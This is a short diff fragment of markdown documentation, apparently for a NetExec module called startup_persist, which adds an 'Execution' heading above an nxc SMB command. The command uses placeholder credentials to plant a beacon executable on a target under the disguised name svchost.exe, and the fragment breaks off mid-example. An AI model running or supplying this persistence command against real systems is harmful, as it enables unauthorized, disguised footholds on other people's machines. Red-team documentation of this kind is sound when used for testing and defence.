@@ -7,7 +7,7 @@ Save Python script to:
 
 ```
 
-
+## Execution
 ```
 nxc smb $IP -u '$username' -p '$password' -M startup_persist -o FILEPATH=/home/kali/Desktop/beacon.exe FILENAME=svchost.exe
   or
